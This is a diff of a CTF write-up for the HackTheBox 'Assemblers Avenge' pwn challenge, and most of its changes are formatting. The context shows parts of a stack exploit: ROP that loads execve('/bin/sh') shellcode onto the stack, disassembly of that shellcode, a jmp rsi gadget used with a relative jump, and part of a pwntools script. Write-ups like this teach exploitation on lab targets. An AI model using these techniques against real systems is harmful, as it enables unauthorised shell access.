@@ -1,10 +1,10 @@
-	# HTB Distopia - PWN | Assemblers Avenge
+# HTB Distopia | Assemblers Avenge - PWN (Easy)
 
 This challenge involved adding shellcode to the stack through recursive ROP calls and executing that shellcode through a relative JMP instruction.
 
 ### Initial Analysis
 
-Looking at checksec there are no memory protections on the binary
+Looking at checksec there are no memory protections on the binary.
 
 ```
 $ checksec assemblers_avenge
@@ -88,16 +88,16 @@ The complete shellcode should now be loaded to the stack
 
 ```
 pwndbg> x/10i $rsp-0x8
-   0x7ffd34e24560:	push   rax
-   0x7ffd34e24561:	xor    rdx,rdx
-   0x7ffd34e24564:	xor    rsi,rsi
-   0x7ffd34e24567:	movabs rbx,0x68732f6e69622f
-   0x7ffd34e24571:	push   rbx
-   0x7ffd34e24572:	push   rsp
-   0x7ffd34e24573:	pop    rdi
-   0x7ffd34e24574:	mov    al,0x3b
-   0x7ffd34e24576:	syscall 
-   0x7ffd34e24578:	rex.B
+0x7ffd34e24560:	push   rax
+0x7ffd34e24561:	xor    rdx,rdx
+0x7ffd34e24564:	xor    rsi,rsi
+0x7ffd34e24567:	movabs rbx,0x68732f6e69622f
+0x7ffd34e24571:	push   rbx
+0x7ffd34e24572:	push   rsp
+0x7ffd34e24573:	pop    rdi
+0x7ffd34e24574:	mov    al,0x3b
+0x7ffd34e24576:	syscall 
+0x7ffd34e24578:	rex.B
 ```
 
 The next step is finding a method of jumping to the top of the shellcode. This can be done through the gadget `0x40106b: jmp rsi;`. Since RSI stores the value of the buffer when `read()` is called, then it can also be used for jumping to the stack. The issue here is that RSI does not contain the location of the shellcode, but of the current buffer. Getting around this is pretty easy by using a relative jump instruction `jmp -0x1a`.
@@ -126,7 +126,7 @@ HOST = '94.237.49.212'
 PORT = 39904
 
 def get_process():
-  return process() # use this if you want to test locally
+  return process() # use this to test locally
   #return remote(HOST, PORT)
 
 def main():
